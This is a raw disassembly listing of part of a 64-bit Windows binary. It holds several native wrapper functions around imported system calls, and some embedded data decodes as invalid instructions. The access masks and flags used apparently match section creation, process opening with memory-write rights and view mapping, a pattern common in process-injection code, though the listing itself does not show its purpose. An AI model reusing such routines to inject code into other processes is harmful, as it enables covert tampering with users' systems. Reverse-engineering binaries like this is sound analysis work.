   140004eea:	12 04 20             	adc    (%rax,%riz,1),%al
   140004eed:	62 03 00 00 58       	(bad)
   140004ef2:	55                   	push   %rbp
   140004ef3:	02 08                	add    (%rax),%cl
   140004ef5:	12 03                	adc    (%rbx),%al
   140004ef7:	28 23                	sub    %ah,(%rbx)
   140004ef9:	00 00                	add    %al,(%rax)
   140004efb:	06                   	(bad)
   140004efc:	26 17                	es (bad)
   140004efe:	0a 02                	or     (%rdx),%al
   140004f00:	0b de                	or     %esi,%ebx
   140004f02:	17                   	(bad)
   140004f03:	06                   	(bad)
   140004f04:	17                   	(bad)
   140004f05:	5f                   	pop    %rdi
   140004f06:	2c 11                	sub    $0x11,%al
   140004f08:	06                   	(bad)
   140004f09:	1f                   	(bad)
   140004f0a:	fe                   	(bad)
   140004f0b:	5f                   	pop    %rdi
   140004f0c:	0a fe                	or     %dh,%bh
   140004f0e:	06                   	(bad)
   140004f0f:	22 00                	and    (%rax),%al
   140004f11:	00 06                	add    %al,(%rsi)
   140004f13:	02 28                	add    (%rax),%ch
   140004f15:	7d 00                	jge    0x140004f17
   140004f17:	00 06                	add    %al,(%rsi)
   140004f19:	dc 07                	faddl  (%rdi)
   140004f1b:	2a 41 1c             	sub    0x1c(%rcx),%al
   140004f1e:	00 00                	add    %al,(%rax)
   140004f20:	04 00                	add    $0x0,%al
   140004f22:	00 00                	add    %al,(%rax)
   140004f24:	4d 28 00             	rex.WRB sub %r8b,(%r8)
   140004f27:	00 06                	add    %al,(%rsi)
   140004f29:	00 00                	add    %al,(%rax)
   140004f2b:	00 53 28             	add    %dl,0x28(%rbx)
   140004f2e:	00 00                	add    %al,(%rax)
   140004f30:	17                   	(bad)
   140004f31:	00 00                	add    %al,(%rax)
   140004f33:	00 3b                	add    %bh,(%rbx)
   140004f35:	00 00                	add    %al,(%rax)
   140004f37:	01 48 8b             	add    %ecx,-0x75(%rax)
   140004f3a:	c4                   	(bad)
   140004f3b:	55                   	push   %rbp
   140004f3c:	57                   	push   %rdi
   140004f3d:	41 56                	push   %r14
   140004f3f:	48 8d 68 88          	lea    -0x78(%rax),%rbp
   140004f43:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140004f4a:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140004f51:	ff ff 
   140004f53:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140004f57:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004f5b:	4c 8d 75 78          	lea    0x78(%rbp),%r14
   140004f5f:	49 8b 36             	mov    (%r14),%rsi
   140004f62:	48 8d 15 57 55 00 00 	lea    0x5557(%rip),%rdx        # 0x14000a4c0
   140004f69:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140004f6e:	e8 ed 40 00 00       	call   0x140009060
   140004f73:	90                   	nop
   140004f74:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   140004f79:	48 8d 0d 50 55 01 00 	lea    0x15550(%rip),%rcx        # 0x14001a4d0
   140004f80:	e8 03 19 00 00       	call   0x140006888
   140004f85:	48 8b f8             	mov    %rax,%rdi
   140004f88:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140004f8d:	e8 be 40 00 00       	call   0x140009050
   140004f92:	33 db                	xor    %ebx,%ebx
   140004f94:	48 85 ff             	test   %rdi,%rdi
   140004f97:	74 03                	je     0x140004f9c
   140004f99:	49 89 3e             	mov    %rdi,(%r14)
   140004f9c:	48 89 9d 80 00 00 00 	mov    %rbx,0x80(%rbp)
   140004fa3:	e8 e9 3a 00 00       	call   0x140008a91
   140004fa8:	44 8b c8             	mov    %eax,%r9d
   140004fab:	4c 8d 05 2e 55 00 00 	lea    0x552e(%rip),%r8        # 0x14000a4e0
   140004fb2:	ba 40 00 00 00       	mov    $0x40,%edx
   140004fb7:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004fbb:	e8 94 19 00 00       	call   0x140006954
   140004fc0:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004fc4:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140004fc9:	e8 ee 19 00 00       	call   0x1400069bc
   140004fce:	c7 44 24 38 30 00 00 	movl   $0x30,0x38(%rsp)
   140004fd5:	00 
   140004fd6:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140004fdb:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   140004fdf:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   140004fe4:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004fe9:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004fec:	f3 0f 7f 44 24 58    	movdqu %xmm0,0x58(%rsp)
   140004ff2:	33 d2                	xor    %edx,%edx
   140004ff4:	44 8d 42 48          	lea    0x48(%rdx),%r8d
   140004ff8:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140004ffc:	e8 ae 3a 00 00       	call   0x140008aaf
   140005001:	48 c7 45 a0 00 10 00 	movq   $0x1000,-0x60(%rbp)
   140005008:	00 
   140005009:	b8 00 00 10 00       	mov    $0x100000,%eax
   14000500e:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140005012:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140005016:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   14000501a:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   14000501e:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140005023:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   14000502a:	ff 15 78 52 01 00    	call   *0x15278(%rip)        # 0x14001a2a8
   140005030:	49 89 36             	mov    %rsi,(%r14)
   140005033:	85 c0                	test   %eax,%eax
   140005035:	48 0f 49 9d 80 00 00 	cmovns 0x80(%rbp),%rbx
   14000503c:	00 
   14000503d:	48 8b c3             	mov    %rbx,%rax
   140005040:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140005047:	00 
   140005048:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000504c:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005050:	49 8b e3             	mov    %r11,%rsp
   140005053:	41 5e                	pop    %r14
   140005055:	5f                   	pop    %rdi
   140005056:	5d                   	pop    %rbp
   140005057:	c3                   	ret
   140005058:	48 8b c4             	mov    %rsp,%rax
   14000505b:	55                   	push   %rbp
   14000505c:	56                   	push   %rsi
   14000505d:	57                   	push   %rdi
   14000505e:	41 56                	push   %r14
   140005060:	41 57                	push   %r15
   140005062:	48 83 ec 70          	sub    $0x70,%rsp
   140005066:	48 c7 40 a8 fe ff ff 	movq   $0xfffffffffffffffe,-0x58(%rax)
   14000506d:	ff 
   14000506e:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140005072:	8b f2                	mov    %edx,%esi
   140005074:	48 8b e9             	mov    %rcx,%rbp
   140005077:	4c 8d bc 24 98 00 00 	lea    0x98(%rsp),%r15
   14000507e:	00 
   14000507f:	4d 8b 37             	mov    (%r15),%r14
   140005082:	48 8d 15 37 54 00 00 	lea    0x5437(%rip),%rdx        # 0x14000a4c0
   140005089:	48 8d 48 b0          	lea    -0x50(%rax),%rcx
   14000508d:	e8 ce 3f 00 00       	call   0x140009060
   140005092:	90                   	nop
   140005093:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140005098:	48 8d 0d 31 54 01 00 	lea    0x15431(%rip),%rcx        # 0x14001a4d0
   14000509f:	e8 e4 17 00 00       	call   0x140006888
   1400050a4:	48 8b f8             	mov    %rax,%rdi
   1400050a7:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400050ac:	e8 9f 3f 00 00       	call   0x140009050
   1400050b1:	33 db                	xor    %ebx,%ebx
   1400050b3:	48 85 ff             	test   %rdi,%rdi
   1400050b6:	74 03                	je     0x1400050bb
   1400050b8:	49 89 3f             	mov    %rdi,(%r15)
   1400050bb:	48 89 9c 24 a0 00 00 	mov    %rbx,0xa0(%rsp)
   1400050c2:	00 
   1400050c3:	48 89 ac 24 b0 00 00 	mov    %rbp,0xb0(%rsp)
   1400050ca:	00 
   1400050cb:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400050d0:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   1400050d7:	08 
   1400050d8:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400050dc:	4c 8d 8c 24 b0 00 00 	lea    0xb0(%rsp),%r9
   1400050e3:	00 
   1400050e4:	45 33 c0             	xor    %r8d,%r8d
   1400050e7:	ba 1f 00 0f 00       	mov    $0xf001f,%edx
   1400050ec:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
   1400050f3:	00 
   1400050f4:	ff 15 be 51 01 00    	call   *0x151be(%rip)        # 0x14001a2b8
   1400050fa:	4d 89 37             	mov    %r14,(%r15)
   1400050fd:	85 c0                	test   %eax,%eax
   1400050ff:	48 0f 49 9c 24 a0 00 	cmovns 0xa0(%rsp),%rbx
   140005106:	00 00 
   140005108:	48 8b c3             	mov    %rbx,%rax
   14000510b:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   140005112:	00 
   140005113:	48 83 c4 70          	add    $0x70,%rsp
   140005117:	41 5f                	pop    %r15
   140005119:	41 5e                	pop    %r14
   14000511b:	5f                   	pop    %rdi
   14000511c:	5e                   	pop    %rsi
   14000511d:	5d                   	pop    %rbp
   14000511e:	c3                   	ret
   14000511f:	cc                   	int3
   140005120:	48 8b c4             	mov    %rsp,%rax
   140005123:	56                   	push   %rsi
   140005124:	57                   	push   %rdi
   140005125:	41 54                	push   %r12
   140005127:	41 56                	push   %r14
   140005129:	41 57                	push   %r15
   14000512b:	48 83 ec 60          	sub    $0x60,%rsp
   14000512f:	48 c7 40 b0 fe ff ff 	movq   $0xfffffffffffffffe,-0x50(%rax)
   140005136:	ff 
   140005137:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000513b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000513f:	49 8b f0             	mov    %r8,%rsi
   140005142:	48 8b ea             	mov    %rdx,%rbp
   140005145:	4c 8b f1             	mov    %rcx,%r14
   140005148:	4c 8d a4 24 88 00 00 	lea    0x88(%rsp),%r12
   14000514f:	00 
   140005150:	4d 8b 3c 24          	mov    (%r12),%r15
   140005154:	48 8d 15 65 53 00 00 	lea    0x5365(%rip),%rdx        # 0x14000a4c0
   14000515b:	48 8d 48 b8          	lea    -0x48(%rax),%rcx
   14000515f:	e8 fc 3e 00 00       	call   0x140009060
   140005164:	90                   	nop
   140005165:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000516a:	48 8d 0d 5f 53 01 00 	lea    0x1535f(%rip),%rcx        # 0x14001a4d0
   140005171:	e8 12 17 00 00       	call   0x140006888
   140005176:	48 8b f8             	mov    %rax,%rdi
   140005179:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000517e:	e8 cd 3e 00 00       	call   0x140009050
   140005183:	33 db                	xor    %ebx,%ebx
   140005185:	48 85 ff             	test   %rdi,%rdi
   140005188:	74 04                	je     0x14000518e
   14000518a:	49 89 3c 24          	mov    %rdi,(%r12)
   14000518e:	48 89 9c 24 a8 00 00 	mov    %rbx,0xa8(%rsp)
   140005195:	00 
   140005196:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000519b:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400051a0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400051a5:	48 8d 84 24 a8 00 00 	lea    0xa8(%rsp),%rax
   1400051ac:	00 
   1400051ad:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400051b2:	4c 8b ce             	mov    %rsi,%r9
   1400051b5:	4c 8b c5             	mov    %rbp,%r8
   1400051b8:	33 d2                	xor    %edx,%edx
   1400051ba:	49 8b ce             	mov    %r14,%rcx
   1400051bd:	ff 15 ed 50 01 00    	call   *0x150ed(%rip)        # 0x14001a2b0
   1400051c3:	4d 89 3c 24          	mov    %r15,(%r12)
   1400051c7:	85 c0                	test   %eax,%eax
   1400051c9:	48 0f 49 9c 24 a8 00 	cmovns 0xa8(%rsp),%rbx
   1400051d0:	00 00 
   1400051d2:	48 8b c3             	mov    %rbx,%rax
   1400051d5:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   1400051da:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400051de:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400051e2:	49 8b e3             	mov    %r11,%rsp
   1400051e5:	41 5f                	pop    %r15
   1400051e7:	41 5e                	pop    %r14
   1400051e9:	41 5c                	pop    %r12
   1400051eb:	5f                   	pop    %rdi
   1400051ec:	5e                   	pop    %rsi
   1400051ed:	c3                   	ret
   1400051ee:	cc                   	int3
   1400051ef:	cc                   	int3
   1400051f0:	48 8b c4             	mov    %rsp,%rax
   1400051f3:	57                   	push   %rdi
   1400051f4:	41 54                	push   %r12
   1400051f6:	41 55                	push   %r13
   1400051f8:	41 56                	push   %r14
   1400051fa:	41 57                	push   %r15
   1400051fc:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140005203:	48 c7 40 b0 fe ff ff 	movq   $0xfffffffffffffffe,-0x50(%rax)
   14000520a:	ff 
   14000520b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000520f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005213:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140005217:	41 8b f1             	mov    %r9d,%esi
   14000521a:	49 8b e8             	mov    %r8,%rbp
   14000521d:	4c 8b f2             	mov    %rdx,%r14
   140005220:	4c 8b f9             	mov    %rcx,%r15
   140005223:	4c 8d ac 24 a8 00 00 	lea    0xa8(%rsp),%r13
   14000522a:	00 
   14000522b:	4d 8b 65 00          	mov    0x0(%r13),%r12
   14000522f:	48 8d 15 8a 52 00 00 	lea    0x528a(%rip),%rdx        # 0x14000a4c0
   140005236:	48 8d 48 b8          	lea    -0x48(%rax),%rcx
   14000523a:	e8 21 3e 00 00       	call   0x140009060
   14000523f:	90                   	nop
   140005240:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140005245:	48 8d 0d 84 52 01 00 	lea    0x15284(%rip),%rcx        # 0x14001a4d0
   14000524c:	e8 37 16 00 00       	call   0x140006888
   140005251:	48 8b f8             	mov    %rax,%rdi
   140005254:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005259:	e8 f2 3d 00 00       	call   0x140009050
   14000525e:	33 db                	xor    %ebx,%ebx
   140005260:	48 85 ff             	test   %rdi,%rdi
   140005263:	74 04                	je     0x140005269
   140005265:	49 89 7d 00          	mov    %rdi,0x0(%r13)
   140005269:	48 89 9c 24 c0 00 00 	mov    %rbx,0xc0(%rsp)
   140005270:	00 
   140005271:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140005276:	89 74 24 48          	mov    %esi,0x48(%rsp)
   14000527a:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   14000527e:	c7 44 24 38 02 00 00 	movl   $0x2,0x38(%rsp)
   140005285:	00 
   140005286:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000528b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005290:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140005295:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000529a:	45 33 c9             	xor    %r9d,%r9d
   14000529d:	4c 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%r8
   1400052a4:	00 
   1400052a5:	49 8b d6             	mov    %r14,%rdx
   1400052a8:	49 8b cf             	mov    %r15,%rcx
   1400052ab:	ff 15 0f 50 01 00    	call   *0x1500f(%rip)        # 0x14001a2c0
   1400052b1:	4d 89 65 00          	mov    %r12,0x0(%r13)
   1400052b5:	85 c0                	test   %eax,%eax
   1400052b7:	48 0f 49 9c 24 c0 00 	cmovns 0xc0(%rsp),%rbx
   1400052be:	00 00 
   1400052c0:	48 8b c3             	mov    %rbx,%rax
   1400052c3:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   1400052ca:	00 
   1400052cb:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400052cf:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400052d3:	49 8b 73 48          	mov    0x48(%r11),%rsi
   1400052d7:	49 8b e3             	mov    %r11,%rsp
   1400052da:	41 5f                	pop    %r15
   1400052dc:	41 5e                	pop    %r14
   1400052de:	41 5d                	pop    %r13
   1400052e0:	41 5c                	pop    %r12
   1400052e2:	5f                   	pop    %rdi
   1400052e3:	c3                   	ret
   1400052e4:	48 8b c4             	mov    %rsp,%rax
   1400052e7:	41 56                	push   %r14
   1400052e9:	48 83 ec 50          	sub    $0x50,%rsp
   1400052ed:	48 c7 40 c8 fe ff ff 	movq   $0xfffffffffffffffe,-0x38(%rax)
   1400052f4:	ff 
   1400052f5:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400052f9:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400052fd:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140005301:	48 8b f9             	mov    %rcx,%rdi
   140005304:	4c 8d 74 24 58       	lea    0x58(%rsp),%r14
   140005309:	49 8b 36             	mov    (%r14),%rsi
   14000530c:	48 8d 15 ad 51 00 00 	lea    0x51ad(%rip),%rdx        # 0x14000a4c0
   140005313:	48 8d 48 d0          	lea    -0x30(%rax),%rcx
   140005317:	e8 44 3d 00 00       	call   0x140009060
   14000531c:	90                   	nop
   14000531d:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140005322:	48 8d 0d a7 51 01 00 	lea    0x151a7(%rip),%rcx        # 0x14001a4d0
   140005329:	e8 5a 15 00 00       	call   0x140006888
   14000532e:	48 8b d8             	mov    %rax,%rbx
   140005331:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005336:	e8 15 3d 00 00       	call   0x140009050
   14000533b:	48 85 db             	test   %rbx,%rbx
   14000533e:	74 03                	je     0x140005343
   140005340:	49 89 1e             	mov    %rbx,(%r14)
   140005343:	e8 4f 37 00 00       	call   0x140008a97
   140005348:	48 8b c8             	mov    %rax,%rcx
   14000534b:	48 8b d7             	mov    %rdi,%rdx
   14000534e:	ff 15 74 4f 01 00    	call   *0x14f74(%rip)        # 0x14001a2c8
   140005354:	49 89 36             	mov    %rsi,(%r14)
   140005357:	f7 d0                	not    %eax
   140005359:	c1 e8 1f             	shr    $0x1f,%eax
   14000535c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005361:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140005366:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000536b:	48 83 c4 50          	add    $0x50,%rsp
   14000536f:	41 5e                	pop    %r14
   140005371:	c3                   	ret
   140005372:	cc                   	int3
   140005373:	cc                   	int3
   140005374:	48 8b c4             	mov    %rsp,%rax
   140005377:	57                   	push   %rdi
   140005378:	41 56                	push   %r14
   14000537a:	41 57                	push   %r15
   14000537c:	48 83 ec 50          	sub    $0x50,%rsp
   140005380:	48 c7 40 b8 fe ff ff 	movq   $0xfffffffffffffffe,-0x48(%rax)
   140005387:	ff 
   140005388:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000538c:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005390:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005394:	49 8b d8             	mov    %r8,%rbx
   140005397:	48 8b fa             	mov    %rdx,%rdi
   14000539a:	48 8b f1             	mov    %rcx,%rsi
   14000539d:	4c 8d 7c 24 68       	lea    0x68(%rsp),%r15
   1400053a2:	4d 8b 37             	mov    (%r15),%r14
   1400053a5:	48 8d 15 14 51 00 00 	lea    0x5114(%rip),%rdx        # 0x14000a4c0
   1400053ac:	48 8d 48 c0          	lea    -0x40(%rax),%rcx
   1400053b0:	e8 ab 3c 00 00       	call   0x140009060
   1400053b5:	90                   	nop
   1400053b6:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400053bb:	48 8d 0d 0e 51 01 00 	lea    0x1510e(%rip),%rcx        # 0x14001a4d0
   1400053c2:	e8 c1 14 00 00       	call   0x140006888
   1400053c7:	48 8b e8             	mov    %rax,%rbp
   1400053ca:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400053cf:	e8 7c 3c 00 00       	call   0x140009050
   1400053d4:	33 d2                	xor    %edx,%edx
   1400053d6:	48 85 ed             	test   %rbp,%rbp
   1400053d9:	74 03                	je     0x1400053de
   1400053db:	49 89 2f             	mov    %rbp,(%r15)
   1400053de:	48 85 db             	test   %rbx,%rbx
   1400053e1:	74 46                	je     0x140005429
   1400053e3:	48 83 fb 10          	cmp    $0x10,%rbx
   1400053e7:	72 28                	jb     0x140005411
   1400053e9:	48 8d 4e ff          	lea    -0x1(%rsi),%rcx
   1400053ed:	48 03 cb             	add    %rbx,%rcx
   1400053f0:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   1400053f4:	48 03 c3             	add    %rbx,%rax
   1400053f7:	48 3b f0             	cmp    %rax,%rsi
   1400053fa:	77 05                	ja     0x140005401
   1400053fc:	48 3b cf             	cmp    %rdi,%rcx
   1400053ff:	73 10                	jae    0x140005411
   140005401:	4c 8b c3             	mov    %rbx,%r8
   140005404:	48 8b d7             	mov    %rdi,%rdx
   140005407:	48 8b ce             	mov    %rsi,%rcx
   14000540a:	e8 ac 36 00 00       	call   0x140008abb
   14000540f:	eb 18                	jmp    0x140005429
   140005411:	48 8d 0c 32          	lea    (%rdx,%rsi,1),%rcx
   140005415:	48 2b fe             	sub    %rsi,%rdi
   140005418:	48 2b da             	sub    %rdx,%rbx
   14000541b:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   14000541e:	88 01                	mov    %al,(%rcx)
   140005420:	48 ff c1             	inc    %rcx
   140005423:	48 83 eb 01          	sub    $0x1,%rbx
   140005427:	75 f2                	jne    0x14000541b
   140005429:	4d 89 37             	mov    %r14,(%r15)
   14000542c:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   140005431:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005435:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140005439:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000543d:	49 8b e3             	mov    %r11,%rsp
   140005440:	41 5f                	pop    %r15
   140005442:	41 5e                	pop    %r14
   140005444:	5f                   	pop    %rdi
   140005445:	c3                   	ret
   140005446:	cc                   	int3
   140005447:	cc                   	int3
   140005448:	48 8b c4             	mov    %rsp,%rax
   14000544b:	55                   	push   %rbp
   14000544c:	41 56                	push   %r14
   14000544e:	41 57                	push   %r15
   140005450:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140005454:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000545b:	48 c7 45 d7 fe ff ff 	movq   $0xfffffffffffffffe,-0x29(%rbp)
   140005462:	ff 
   140005463:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005467:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000546b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000546f:	8b f1                	mov    %ecx,%esi
   140005471:	4c 8d 7d 5f          	lea    0x5f(%rbp),%r15
   140005475:	4d 8b 37             	mov    (%r15),%r14
   140005478:	48 8d 15 41 50 00 00 	lea    0x5041(%rip),%rdx        # 0x14000a4c0
   14000547f:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   140005483:	e8 d8 3b 00 00       	call   0x140009060
   140005488:	90                   	nop
   140005489:	48 8d 55 ef          	lea    -0x11(%rbp),%rdx
   14000548d:	48 8d 0d 3c 50 01 00 	lea    0x1503c(%rip),%rcx        # 0x14001a4d0
   140005494:	e8 ef 13 00 00       	call   0x140006888
   140005499:	48 8b f8             	mov    %rax,%rdi
   14000549c:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   1400054a0:	e8 ab 3b 00 00       	call   0x140009050
   1400054a5:	33 db                	xor    %ebx,%ebx
   1400054a7:	48 85 ff             	test   %rdi,%rdi
   1400054aa:	74 03                	je     0x1400054af
   1400054ac:	49 89 3f             	mov    %rdi,(%r15)
   1400054af:	48 89 5d 6f          	mov    %rbx,0x6f(%rbp)
   1400054b3:	c7 45 0f 30 00 00 00 	movl   $0x30,0xf(%rbp)
   1400054ba:	48 89 5d 17          	mov    %rbx,0x17(%rbp)
   1400054be:	89 5d 27             	mov    %ebx,0x27(%rbp)
   1400054c1:	48 89 5d 1f          	mov    %rbx,0x1f(%rbp)
   1400054c5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400054c8:	f3 0f 7f 45 2f       	movdqu %xmm0,0x2f(%rbp)
   1400054cd:	48 89 75 df          	mov    %rsi,-0x21(%rbp)
   1400054d1:	48 89 5d e7          	mov    %rbx,-0x19(%rbp)
   1400054d5:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   1400054d9:	4c 8d 45 0f          	lea    0xf(%rbp),%r8
   1400054dd:	ba 3a 04 00 00       	mov    $0x43a,%edx
   1400054e2:	48 8d 4d 6f          	lea    0x6f(%rbp),%rcx
   1400054e6:	ff 15 ac 4d 01 00    	call   *0x14dac(%rip)        # 0x14001a298
   1400054ec:	4d 89 37             	mov    %r14,(%r15)
   1400054ef:	85 c0                	test   %eax,%eax
   1400054f1:	48 0f 49 5d 6f       	cmovns 0x6f(%rbp),%rbx
   1400054f6:	48 8b c3             	mov    %rbx,%rax
   1400054f9:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140005500:	00 
   140005501:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005505:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005509:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   14000550d:	49 8b e3             	mov    %r11,%rsp
   140005510:	41 5f                	pop    %r15
   140005512:	41 5e                	pop    %r14
   140005514:	5d                   	pop    %rbp
   140005515:	c3                   	ret
   140005516:	cc                   	int3
   140005517:	cc                   	int3
   140005518:	48 8b c4             	mov    %rsp,%rax
   14000551b:	41 56                	push   %r14
   14000551d:	48 83 ec 50          	sub    $0x50,%rsp
   140005521:	48 c7 40 c8 fe ff ff 	movq   $0xfffffffffffffffe,-0x38(%rax)
   140005528:	ff 
   140005529:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000552d:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005531:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005535:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005539:	48 8b fa             	mov    %rdx,%rdi
   14000553c:	48 8b f1             	mov    %rcx,%rsi
   14000553f:	4c 8d 74 24 58       	lea    0x58(%rsp),%r14
   140005544:	49 8b 2e             	mov    (%r14),%rbp
   140005547:	48 8d 15 72 4f 00 00 	lea    0x4f72(%rip),%rdx        # 0x14000a4c0
   14000554e:	48 8d 48 d0          	lea    -0x30(%rax),%rcx
   140005552:	e8 09 3b 00 00       	call   0x140009060
   140005557:	90                   	nop
   140005558:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000555d:	48 8d 0d 6c 4f 01 00 	lea    0x14f6c(%rip),%rcx        # 0x14001a4d0
   140005564:	e8 1f 13 00 00       	call   0x140006888
   140005569:	48 8b d8             	mov    %rax,%rbx
   14000556c:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005571:	e8 da 3a 00 00       	call   0x140009050
   140005576:	48 85 db             	test   %rbx,%rbx
   140005579:	74 03                	je     0x14000557e
   14000557b:	49 89 1e             	mov    %rbx,(%r14)
   14000557e:	48 8b d7             	mov    %rdi,%rdx
   140005581:	48 8b ce             	mov    %rsi,%rcx
   140005584:	e8 77 3a 00 00       	call   0x140009000
   140005589:	49 89 2e             	mov    %rbp,(%r14)
   14000558c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005591:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005596:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000559b:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400055a0:	48 83 c4 50          	add    $0x50,%rsp
   1400055a4:	41 5e                	pop    %r14
   1400055a6:	c3                   	ret
   1400055a7:	cc                   	int3
   1400055a8:	0b 30                	or     (%rax),%esi
   1400055aa:	02 00                	add    (%rax),%al
   1400055ac:	7b 00                	jnp    0x1400055ae
   1400055ae:	00 00                	add    %al,(%rax)
   1400055b0:	23 00                	and    (%rax),%eax
   1400055b2:	00 11                	add    %dl,(%rcx)
   1400055b4:	02 4c 13 04          	add    0x4(%rbx,%rdx,1),%cl
   1400055b8:	11 04 2c             	adc    %eax,(%rsp,%rbp,1)
   1400055bb:	72 02                	jb     0x1400055bf
   1400055bd:	1e                   	(bad)
   1400055be:	6a 58                	push   $0x58
   1400055c0:	4c 0d 11 04 0a 06    	rex.WR or $0x60a0411,%rax
   1400055c6:	09 2e                	or     %ebp,(%rsi)
   1400055c8:	23 06                	and    (%rsi),%eax
   1400055ca:	13 06                	adc    (%rsi),%eax
   1400055cc:	06                   	(bad)
   1400055cd:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   1400055d0:	00 06                	add    %al,(%rsi)
   1400055d2:	de 0e                	fimuls (%rsi)
   1400055d4:	fe 06                	incb   (%rsi)
   1400055d6:	2e 00 00             	cs add %al,(%rax)
   1400055d9:	06                   	(bad)
   1400055da:	11 06                	adc    %eax,(%rsi)
   1400055dc:	28 7d 00             	sub    %bh,0x0(%rbp)
   1400055df:	00 06                	add    %al,(%rsi)
   1400055e1:	dc 06                	faddl  (%rsi)
   1400055e3:	1f                   	(bad)
